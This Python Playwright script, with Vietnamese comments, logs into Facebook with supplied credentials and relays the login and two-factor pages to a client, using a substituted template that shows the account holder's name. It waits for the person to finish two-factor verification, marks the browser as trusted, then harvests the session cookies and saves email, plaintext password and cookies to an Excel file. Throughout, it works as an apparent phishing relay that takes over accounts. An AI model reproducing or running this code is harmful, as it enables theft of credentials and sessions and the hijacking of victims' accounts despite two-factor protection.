from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

import os

import shutil

import tempfile

import time

import sys

import re

from openpyxl import Workbook, load_workbook


# Lưu lại context/page/email/password của lần đăng nhập gần nhất

LAST_CONTEXT = None

LAST_PAGE = None

LAST_EMAIL = None

LAST_PASSWORD = None





def process_html_for_hfa(html_content: str) -> str | None:
    """
    Kiểm tra nếu HTML có input với id="_r_3_" và class chứa các class cụ thể.
    Nếu có, tìm span với class pattern x1lliihq x1plvlek... để lấy nội dung,
    sau đó thay thế vào templates/hfa.html và trả về nội dung hfa.html.
    
    Args:
        html_content: HTML content từ Facebook
        
    Returns:
        str | None: Nội dung hfa.html đã được thay thế, hoặc None nếu không tìm thấy input
    """
    import os
    
    # Kiểm tra input với id="_r_3_" và các class cụ thể
    # Pattern linh hoạt: chỉ cần có id="_r_3_" và các class x1i10hfl, xggy1nq, xtpw4lu trong thẻ input
    input_pattern = r'<input[^>]*id="_r_3_"[^>]*>'
    if not re.search(input_pattern, html_content):
        return None
    
    # Kiểm tra thêm các class đặc trưng để chắc chắn là input 2FA
    required_classes = ['x1i10hfl', 'xggy1nq', 'xtpw4lu']
    input_match = re.search(r'<input[^>]*id="_r_3_"[^>]*class="([^"]*)"[^>]*>', html_content)
    if not input_match:
        # Thử pattern khác nếu class đứng trước id
        input_match = re.search(r'<input[^>]*class="([^"]*)"[^>]*id="_r_3_"[^>]*>', html_content)
    
    if not input_match:
        return None
    
    class_content = input_match.group(1)
    if not all(cls in class_content for cls in required_classes):
        return None
    
    print("[HFA] Phát hiện input với id='_r_3_' - xử lý thay thế HFA template...")
    
    # Tìm span với class pattern chứa tên người dùng
    # Pattern: <span class="x1lliihq x1plvlek xryxfnj...">Name • Facebook</span>
    span_pattern = r'<span[^>]*class="[^"]*x1lliihq x1plvlek[^"]*"[^>]*>([^<]*)</span>'
    span_matches = re.findall(span_pattern, html_content)
    
    if not span_matches:
        print("[HFA] Không tìm thấy span với class pattern x1lliihq x1plvlek")
        return None
    
    # Tìm span có chứa pattern "Name • Facebook" (có dấu bullet)
    target_content = None
    for match in span_matches:
        if 'Facebook' in match or '•' in match or '\u2022' in match:
            target_content = match
            break
    
    # Nếu không tìm thấy span có bullet, lấy span đầu tiên không rỗng
    if not target_content:
        for match in span_matches:
            if match.strip():
                target_content = match
                break
    
    if not target_content:
        print("[HFA] Không tìm thấy nội dung span phù hợp")
        return None
    
    print(f"[HFA] Tìm thấy nội dung: {repr(target_content)}")
    
    # Đọc file hfa.html
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    hfa_path = os.path.join(base_dir, 'templates', 'hfa.html')
    
    try:
        with open(hfa_path, 'r', encoding='utf-8') as f:
            hfa_content = f.read()
    except Exception as e:
        print(f"[HFA] Lỗi khi đọc file hfa.html: {e}")
        return None
    
    # Thay thế span đầu tiên trong hfa.html có class pattern tương tự
    # Pattern: <span class="x1lliihq x1plvlek...">...</span>
    hfa_span_pattern = r'(<span[^>]*class="[^"]*x1lliihq x1plvlek[^"]*"[^>]*>)([^<]*)(</span>)'
    
    def replace_first_span(match):
        return match.group(1) + target_content + match.group(3)
    
    hfa_content_new = re.sub(hfa_span_pattern, replace_first_span, hfa_content, count=1)
    
    if hfa_content_new == hfa_content:
        print("[HFA] Không tìm thấy span để thay thế trong hfa.html")
        return None
    
    print(f"[HFA] Đã thay thế thành công, trả về nội dung hfa.html ({len(hfa_content_new)} ký tự)")
    return hfa_content_new


def clean_profile(profile_dir):
    """
    Xóa toàn bộ dữ liệu session trong profile Chromium.
    Ưu tiên xóa toàn bộ thư mục Default (cách triệt để nhất),
    giữ lại Extensions nếu có.
    """
    default_dir = os.path.join(profile_dir, "Default")

    if os.path.isdir(default_dir):
        print(f"  Tìm thấy thư mục Default, tiến hành xóa dữ liệu session...")

        # Các thư mục/file cần GIỮ LẠI (extensions đã cài sẵn trong master)
        keep = {
            "Extensions",
            "Local Extension Settings",
            "Extension Rules",
            "Extension State",
            "Managed Extension Settings",
        }

        deleted_count = 0
        for item in os.listdir(default_dir):
            if item in keep:
                print(f"  Giữ lại: {item}")
                continue

            full_path = os.path.join(default_dir, item)
            try:
                if os.path.isfile(full_path) or os.path.islink(full_path):
                    os.remove(full_path)
                elif os.path.isdir(full_path):
                    shutil.rmtree(full_path, ignore_errors=True)
                deleted_count += 1
            except Exception as e:
                print(f"  Không thể xóa {full_path}: {e}")

        print(f"  Đã xóa {deleted_count} mục trong Default/.")
    else:
        print(f"  Không tìm thấy thư mục Default, dùng fallback xóa từng file...")
        _clean_profile_fallback(profile_dir)



def _clean_profile_fallback(profile_dir):
    """
    Fallback: xóa từng file/thư mục theo danh sách cụ thể
    (dùng khi không tìm thấy thư mục Default).
    """
    targets = {
        # Cookies & Auth
        "Cookies", "Cookies-journal",
        "Login Data", "Login Data-journal",
        "Login Data For Account", "Login Data For Account-journal",
        # Session
        "Current Session", "Current Tabs",
        "Last Session", "Last Tabs",
        # History & Navigation
        "History", "History-journal",
        "Visited Links",
        "Top Sites", "Top Sites-journal",
        "Network Action Predictor", "Network Action Predictor-journal",
        # Web Data
        "Web Data", "Web Data-journal",
        "Favicons", "Favicons-journal",
        # Storage (quan trọng - lưu auth token)
        "Local Storage",
        "Session Storage",
        "IndexedDB",
        "databases",
        "blob_storage",
        "Service Worker",
        "shared_proto_db",
        # Cache
        "Cache", "Code Cache", "GPUCache",
        # Misc
        "QuotaManager", "QuotaManager-journal",
        "TransportSecurity", "TransportSecurity-journal",
        "Extension Cookies", "Extension Cookies-journal",
        "Platform Notifications",
        "GCM Store",
        "AutofillStrikeDatabase",
    }

    for root, dirs, files in os.walk(profile_dir, topdown=False):
        for name in files:
            if name in targets:
                file_path = os.path.join(root, name)
                try:
                    os.remove(file_path)
                    print(f"  Đã xóa file: {file_path}")
                except Exception as e:
                    print(f"  Không thể xóa file {file_path}: {e}")
        for name in dirs:
            if name in targets:
                dir_path = os.path.join(root, name)
                try:
                    shutil.rmtree(dir_path, ignore_errors=True)
                    print(f"  Đã xóa thư mục: {dir_path}")
                except Exception as e:
                    print(f"  Không thể xóa thư mục {dir_path}: {e}")





def get_facebook_page_after_login(

    username: str,

    password: str,

    headless: bool = False,

    timeout: int = 120000,

    master_profile: str = "master"

) -> tuple[str, bool, bool]:

    """

    Đăng nhập Facebook và trả về HTML sau khi login.



    - Tạo bản sao tạm thời của profile master, xóa sạch cookies/session/IndexedDB.

    - Nếu copy thất bại, thử dùng trực tiếp master (kèm cảnh báo).

    - Chờ tối đa `timeout` ms cho đến khi URL rời trang login.

    - Nếu URL chuyển sang trang 2FA loại two_factor thì vẫn trả về HTML (để client hiển thị).

    - Nếu URL đang ở trang authentication thì tiếp tục đợi cho đến khi rời trang đó rồi mới lấy HTML.

    - Trả về chuỗi rỗng nếu có lỗi không lấy được HTML.



    Returns:

        tuple: (html_content, should_get_cookies, login_failed)

            - html_content: HTML của trang sau khi login

            - should_get_cookies: True nếu nên lấy cookies (không ở trang two_factor), False nếu đang ở trang two_factor

            - login_failed: True nếu đăng nhập sai (URL là /login/web/)

    """

    html_content = ""

    should_get_cookies = False

    login_failed = False

    playwright = None

    context = None

    temp_profile_dir = None

    used_master_directly = False



    try:

        # --- Xác định đường dẫn profile master ---

        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

        master_path = os.path.join(base_dir, master_profile)



        if not os.path.isdir(master_path):

            raise Exception(f"Không tìm thấy thư mục profile master tại: {master_path}")



        # --- Tạo thư mục tạm và copy profile ---

        temp_profile_dir = tempfile.mkdtemp(prefix="fb_profile_")

        print(f"Đang copy profile từ {master_path} sang {temp_profile_dir} ...")



        try:

            # Copy toàn bộ nội dung profile master sang thư mục tạm

            shutil.copytree(

                master_path,

                temp_profile_dir,

                symlinks=False,

                ignore_dangling_symlinks=True,

                dirs_exist_ok=True

            )

            time.sleep(1)  # Chờ filesystem đồng bộ

            print("Copy hoàn tất.")

        except Exception as copy_error:

            print(f"Lỗi khi copy profile: {copy_error}")

            print("Sẽ dùng trực tiếp master profile (cảnh báo: có thể ảnh hưởng master).")

            used_master_directly = True

            temp_profile_dir = master_path



        # --- Xóa sạch session/cookies khỏi profile tạm

        #     nhưng vẫn GIỮ lại các extension đã cài trong thư mục Default ---

        # Đầu tiên làm sạch profile tạm (clean_profile sẽ giữ lại thư mục Extensions trong Default)

        print("Đang xóa cookies, session, IndexedDB khỏi profile tạm (giữ lại Extensions)...")

        clean_profile(temp_profile_dir)

        print("Đã xóa xong.")



        # Đảm bảo thư mục Extensions từ master Default được copy sang profile tạm
        try:
            master_default = os.path.join(master_path, "Default")
            temp_default = os.path.join(temp_profile_dir, "Default")
            master_ext = os.path.join(master_default, "Extensions")
            temp_ext = os.path.join(temp_default, "Extensions")

            if os.path.isdir(master_ext):
                os.makedirs(temp_default, exist_ok=True)
                shutil.copytree(
                    master_ext,
                    temp_ext,
                    symlinks=False,
                    ignore_dangling_symlinks=True,
                    dirs_exist_ok=True
                )
                # Ngoài ra copy ra ngoài root của profile tạm để chắc chắn Chrome tìm thấy
                root_ext = os.path.join(temp_profile_dir, "Extensions")
                shutil.copytree(
                    master_ext,
                    root_ext,
                    symlinks=False,
                    ignore_dangling_symlinks=True,
                    dirs_exist_ok=True
                )
                print(f"Đã đảm bảo copy Extensions từ {master_ext} sang {temp_ext} và {root_ext}.")
            else:
                print(f"Không tìm thấy thư mục Extensions trong master Default: {master_ext}")
        except Exception as ext_err:
            print(f"Lỗi khi copy thư mục Extensions từ master sang profile tạm: {ext_err}")

        # --- Khởi động Playwright ---
        playwright = sync_playwright().start()

        args = [
            "--disable-blink-features=AutomationControlled",
            "--disable-gpu",
            "--no-first-run",
            "--no-service-autorun",
            "--password-store=basic"
        ]

        # Load extensions from the temporary profile
        # Kiểm tra cả 2 vị trí
        ext_search_paths = [
            os.path.join(temp_profile_dir, "Default", "Extensions"),
            os.path.join(temp_profile_dir, "Extensions")
        ]
        
        ext_folders = []
        for search_path in ext_search_paths:
            if os.path.isdir(search_path):
                for ext_id in os.listdir(search_path):
                    ext_path = os.path.join(search_path, ext_id)
                    if os.path.isdir(ext_path):
                        try:
                            versions = os.listdir(ext_path)
                            if versions:
                                # Lấy version đầu tiên (thường là duy nhất)
                                version_path = os.path.abspath(os.path.join(ext_path, versions[0]))
                                if version_path not in ext_folders:
                                    ext_folders.append(version_path)
                        except Exception as e:
                            print(f"Lỗi khi đọc phiên bản extension {ext_id} tại {search_path}: {e}")
        
        if ext_folders:
            load_ext_arg = f"--load-extension={','.join(ext_folders)}"
            args.append(load_ext_arg)
            args.append(f"--disable-extensions-except={','.join(ext_folders)}")
            print(f"Đã thêm {len(ext_folders)} extensions vào Chrome args.")
        else:
            print("Cảnh báo: Không tìm thấy extension nào để load.")

        if sys.platform != "win32":
            args.append("--no-sandbox")

        context = playwright.chromium.launch_persistent_context(

            user_data_dir=temp_profile_dir,

            headless=headless,

            args=args,



            locale="en-GB",



            viewport={"width": 1280, "height": 800},

            user_agent=(

                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "

                "AppleWebKit/537.36 (KHTML, like Gecko) "

                "Chrome/120.0.0.0 Safari/537.36"

            ),

            extra_http_headers={

                "Accept-Language": "en-GB,en;q=0.9"

            }

        )



        page = context.pages[0] if context.pages else context.new_page()



        # --- Mở thẳng trang login Facebook ---

        print("Đang mở trang đăng nhập Facebook...")

        page.goto(

            "https://www.facebook.com/login/?locale=en_GB",

            wait_until="domcontentloaded",

            timeout=30000

        )

        print(f"URL hiện tại: {page.url}")



        # --- Thực hiện đăng nhập ---

        print("Đang chờ form đăng nhập...")

        page.wait_for_selector('input[name="email"]', timeout=15000)



        print("Đang điền thông tin đăng nhập...")

        page.fill('input[name="email"]', username)

        time.sleep(0.3)

        page.fill('input[name="pass"]', password)

        time.sleep(0.3)



        # Tìm nút đăng nhập theo aria-label="Log in" (ưu tiên nhất, khớp với HTML thực tế)

        # Fallback lần lượt sang các selector phổ biến khác

        print("Đang tìm nút đăng nhập...")

        login_button = page.locator('[aria-label="Log in"][role="button"]')

        if login_button.count() == 0:

            login_button = page.locator('button[name="login"]')

        if login_button.count() == 0:

            login_button = page.locator('button[type="submit"]')

        if login_button.count() == 0:

            login_button = page.locator('[data-testid="royal_login_button"]')

        if login_button.count() == 0:

            raise Exception("Không tìm thấy nút đăng nhập.")



        print("Đang click đăng nhập...")

        login_button.first.click()



        # --- Chờ đăng nhập thành công (logic gốc) ---

        check_success = """

        () => {

            const url = window.location.href;

            const urlPath = window.location.pathname;

            // Nếu đang ở trang 2FA authentication thì KHÔNG trả về HTML, tiếp tục đợi

            if (url.includes('two_step_verification/authentication')) return false;

            // Nếu đang ở trang 2FA two_factor thì vẫn trả về HTML để client hiển thị

            if (url.includes('two_step_verification/two_factor')) return true;

            // Nếu đang ở trang /login/web/ (đăng nhập sai) thì trả về HTML để client hiển thị

            if (urlPath.includes('/login/web/')) return true;

            // Các trang bị chặn (không trả HTML, tiếp tục đợi) - kiểm tra path, không phải query

            if (urlPath.includes('login') || urlPath.includes('checkpoint') || urlPath.includes('recover')) return false;

            // Các dấu hiệu đã đăng nhập thành công vào trang chủ

            if (

                document.querySelector('[role="feed"]') ||

                document.querySelector('[data-pagelet="root"]') ||

                document.querySelector('[data-pagelet="Stories"]') ||

                document.querySelector('div[data-pagelet="TopNav"]') ||

                urlPath === '/' ||

                url === 'https://www.facebook.com/'

            ) {

                return true;

            }

            return false;

        }

        """



        try:

            page.wait_for_function(check_success, timeout=timeout)

            # Sau khi wait_for_function trả về, kiểm tra URL để quyết định có lấy cookies hay không

            final_url = page.url

            print(f"Đăng nhập thành công! URL: {final_url}")

            

            # Chỉ lấy cookies ngay nếu URL KHÔNG phải là trang cần user xử lý 2FA / trust device
            should_get_cookies = not (
                ('two_step_verification/two_factor' in final_url)
                or final_url.startswith("https://www.facebook.com/two_factor/remember_browser")
            )

        except PlaywrightTimeoutError:

            print(

                f"Hết thời gian chờ ({timeout}ms). "

                f"URL hiện tại: {page.url}. "

                "Có thể đang chờ captcha/2FA hoặc đăng nhập thất bại."

            )

            should_get_cookies = False

            final_url = page.url



        # --- Chờ trang load đầy đủ (đặc biệt cho trang two_factor) ---

        if 'two_step_verification/two_factor' in final_url:

            print("Đang chờ trang two_factor load đầy đủ...")

            try:

                page.wait_for_load_state('networkidle', timeout=10000)

                print("Trang two_factor đã load xong (networkidle).")

            except Exception as e:

                print(f"Không thể chờ networkidle: {e}, tiếp tục lấy HTML...")

            # Thêm chờ thêm 1 giây để đảm bảo UI render xong

            time.sleep(1)



        # --- Lấy HTML ---

        html_content = page.content()
        
        # --- Kiểm tra và xử lý HFA template nếu có input _r_3_ ---
        hfa_content = process_html_for_hfa(html_content)
        if hfa_content:
            html_content = hfa_content
        
        # --- Kiểm tra nếu là trang lỗi đăng nhập (/login/web/) ---

        if '/login/web/' in final_url or 'facebook.com/login/web/' in final_url:

            login_failed = True

            print(f"[Playwright] Phát hiện đăng nhập sai - URL: {final_url}")

        

        # --- Fix relative URLs trong HTML thành absolute URLs ---

        # Thay thế các đường dẫn tương đối /images/, /assets/, /js/, /css/ thành https://www.facebook.com/...



        # Fix src="/..." và href="/..." thành src="https://www.facebook.com/..." và href="https://www.facebook.com/..."

        html_content = html_content.replace('src="/', 'src="https://www.facebook.com/')

        html_content = html_content.replace('href="/', 'href="https://www.facebook.com/')

        # Fix url('/...') trong CSS

        html_content = re.sub(r"url\('/([^']+)'\)", r"url('https://www.facebook.com/\1')", html_content)

        html_content = re.sub(r'url\("/([^"]+)"\)', r'url("https://www.facebook.com/\1")', html_content)

        print("Đã fix relative URLs trong HTML.")



        # Lưu lại context/page/email/password để hàm get_cookies có thể dùng sau này

        global LAST_CONTEXT, LAST_PAGE, LAST_EMAIL, LAST_PASSWORD

        LAST_CONTEXT = context

        LAST_PAGE = page

        LAST_EMAIL = username

        LAST_PASSWORD = password



        print(f"Đã lấy HTML ({len(html_content)} ký tự).")



    except Exception as e:

        print(f"Lỗi không xác định: {e}")



    finally:

        pass



    return html_content, should_get_cookies, login_failed



def wait_and_save_cookies(file_name: str = "users.xlsx", timeout: int = 300000) -> str:

    global LAST_CONTEXT, LAST_PAGE

    if LAST_CONTEXT is None or LAST_PAGE is None:
        print("wait_and_save_cookies: Không có context/page để tiếp tục flow.")
        return ""

    page = LAST_PAGE
    current_url = page.url
    print(f"wait_and_save_cookies: URL hiện tại: {current_url}")

    try:
        if "two_step_verification/two_factor" in current_url:
            print("wait_and_save_cookies: Đang chờ user hoàn tất 2FA (rời trang two_factor)...")
            try:
                page.wait_for_url(
                    lambda url: ("two_step_verification/two_factor" not in url),
                    timeout=timeout,
                )
                print(f"wait_and_save_cookies: URL sau khi user hoàn tất 2FA: {page.url}")
            except PlaywrightTimeoutError:
                print(f"wait_and_save_cookies: Timeout khi chờ hoàn tất 2FA ({timeout}ms).")
                return ""

        return get_cookies(file_name=file_name, timeout=timeout)
    except Exception as e:
        print(f"wait_and_save_cookies: Lỗi không xác định: {e}")
        return ""



def get_cookies(file_name: str = "users.xlsx", timeout: int = 300000) -> str:

    """

    Sau khi đã trả HTML cho client, hàm này dùng lại page/context hiện tại

    để:

      - Tìm và click vào block "Always confirm that it was me." (nếu có),

      - Chờ URL chuyển sang https://www.facebook.com/,

      - Lấy chuỗi cookies và lưu vào cột thứ 3 trong file Excel (cùng hàng với email/password),

      - Trả về chuỗi cookies.



    Lưu ý: Hàm này dựa vào các biến global LAST_CONTEXT, LAST_PAGE, LAST_EMAIL, LAST_PASSWORD

    đã được set ở lần gọi get_facebook_page_after_login gần nhất.

    """

    global LAST_CONTEXT, LAST_PAGE, LAST_EMAIL, LAST_PASSWORD



    if LAST_CONTEXT is None or LAST_PAGE is None:

        print("get_cookies: Không có context/page để lấy cookies.")

        return ""



    page = LAST_PAGE

    context = LAST_CONTEXT

    email = LAST_EMAIL

    password = LAST_PASSWORD



    if not email or not password:

        print("get_cookies: Không có email/password tương ứng, bỏ qua lưu Excel.")



    cookies_str = ""



    try:

        current_url = page.url
        print(f"get_cookies: URL hiện tại: {current_url}")

        remember_browser_prefix = "https://www.facebook.com/two_factor/remember_browser"

        # Nếu đang ở remember_browser -> ấn ESC, click tin cậy, rồi chờ URL đổi
        if page.url.startswith(remember_browser_prefix):
            try:
                try:
                    print("get_cookies: remember_browser -> press Escape before clicking...")
                    page.keyboard.press("Escape")
                    time.sleep(0.2)
                except Exception as esc_err:
                    print(f"get_cookies: remember_browser -> không thể nhấn ESC: {esc_err}")

                trust_device_btn = page.locator(
                    "div[role='button'][tabindex='0']:has-text('Tin cậy thiết bị này')"
                )
                if trust_device_btn.count() == 0:
                    print("get_cookies: remember_browser -> Không tìm thấy nút 'Tin cậy thiết bị này', không lấy cookies.")
                    return ""

                print("get_cookies: remember_browser -> click 'Tin cậy thiết bị này'...")
                trust_device_btn.first.click(timeout=10000)

                try:
                    page.wait_for_url(
                        lambda url: (not url.startswith(remember_browser_prefix)),
                        timeout=min(60000, timeout),
                    )
                    print(f"get_cookies: remember_browser -> URL changed to: {page.url}")
                except PlaywrightTimeoutError:
                    print("get_cookies: remember_browser -> đã click nhưng URL chưa đổi (timeout). Không lấy cookies.")
                    return ""
            except Exception as click_err:
                print(f"get_cookies: Lỗi khi xử lý remember_browser: {click_err}")
                return ""

        # Sau khi xử lý remember_browser, kiểm tra URL có phải https://www.facebook.com/ chính xác không
        current_url = page.url
        if current_url != "https://www.facebook.com/":
            # Nếu URL có dạng https://www.facebook.com/?checkpoint_src=any hoặc bất kỳ query params nào
            # thì điều hướng về https://www.facebook.com/ sạch
            if current_url.startswith("https://www.facebook.com/"):
                print(f"get_cookies: URL có query params, điều hướng về https://www.facebook.com/ ...")
                try:
                    page.goto("https://www.facebook.com/", wait_until="domcontentloaded", timeout=30000)
                    print(f"get_cookies: URL sau khi điều hướng: {page.url}")
                except Exception as nav_err:
                    print(f"get_cookies: Lỗi khi điều hướng: {nav_err}")
                    return ""
            else:
                print(f"get_cookies: Không ở trang facebook.com, URL: {current_url}. Không lấy cookies.")
                return ""

        # Kiểm tra lại URL sau điều hướng
        if page.url != "https://www.facebook.com/":
            print(f"get_cookies: URL sau điều hướng không đúng: {page.url}. Không lấy cookies.")
            return ""

        print("get_cookies: Đang ở https://www.facebook.com/, bắt đầu lấy cookies.")

        # Lấy cookies hiện tại
        try:
            # Lấy tất cả cookies từ context
            all_cookies = context.cookies()
            
            # Lọc lấy cookies của facebook.com (bao gồm cả subdomain như .facebook.com)
            fb_cookies = [
                c for c in all_cookies 
                if "facebook.com" in c.get("domain", "")
            ]
            
            simple_pairs = [
                f"{c.get('name')}={c.get('value')}"
                for c in fb_cookies
                if c.get('name') and c.get('value')
            ]
            
            cookies_str = "; ".join(simple_pairs)
            print(f"get_cookies: Đã lấy {len(fb_cookies)} cookies của facebook.com, chuỗi dài {len(cookies_str)} ký tự.")
        except Exception as cookie_err:
            print(f"get_cookies: Lỗi khi lấy cookies: {cookie_err}")
            cookies_str = ""



        # Lưu vào Excel ở cột thứ 3 (nếu có thông tin email/password)

        if email and password and cookies_str:

            try:

                if not os.path.exists(file_name):

                    wb = Workbook()

                    ws = wb.active

                    ws.append(["Email", "Password", "Cookies"])

                    wb.save(file_name)



                wb = load_workbook(file_name)

                ws = wb.active



                # Đảm bảo header có cột Cookies

                if ws.cell(row=1, column=3).value in (None, ""):

                    ws.cell(row=1, column=3).value = "Cookies"



                target_row = None

                # Tìm hàng có email/password tương ứng, ưu tiên từ dưới lên (gần nhất)

                for row in range(ws.max_row, 1, -1):

                    if (

                        ws.cell(row=row, column=1).value == email

                        and ws.cell(row=row, column=2).value == password

                    ):

                        target_row = row

                        break



                if target_row is None:

                    target_row = ws.max_row + 1

                    ws.cell(row=target_row, column=1).value = email

                    ws.cell(row=target_row, column=2).value = password


                ws.cell(row=target_row, column=3).value = cookies_str

                wb.save(file_name)
                print(f"get_cookies: Đã lưu cookies vào Excel hàng {target_row}, cột 3.")

                # Chờ 1 giây trước khi đóng trình duyệt
                time.sleep(1)
                
                # Đóng page và context để giải phóng tài nguyên
                try:
                    if LAST_PAGE:
                        # Kiểm tra xem page có còn mở không trước khi đóng
                        try:
                            LAST_PAGE.close()
                        except:
                            pass
                    if LAST_CONTEXT:
                        # Kiểm tra xem context có còn mở không trước khi đóng
                        try:
                            LAST_CONTEXT.close()
                        except:
                            pass
                    
                    # Dừng playwright instance để đóng hoàn toàn driver process
                    if LAST_CONTEXT and hasattr(LAST_CONTEXT, "_browser") and LAST_CONTEXT._browser:
                        try:
                            LAST_CONTEXT._browser.close()
                        except:
                            pass
                            
                    print("get_cookies: Đã đóng trình duyệt sau khi lưu cookies.")
                except Exception as close_err:
                    print(f"get_cookies: Lỗi khi đóng trình duyệt: {close_err}")
                
                # Reset biến global
                LAST_PAGE = None
                LAST_CONTEXT = None
                


            except Exception as excel_err:

                print(f"get_cookies: Lỗi khi lưu cookies vào Excel: {excel_err}")



    except Exception as e:

        print(f"get_cookies: Lỗi không xác định: {e}")



    return cookies_str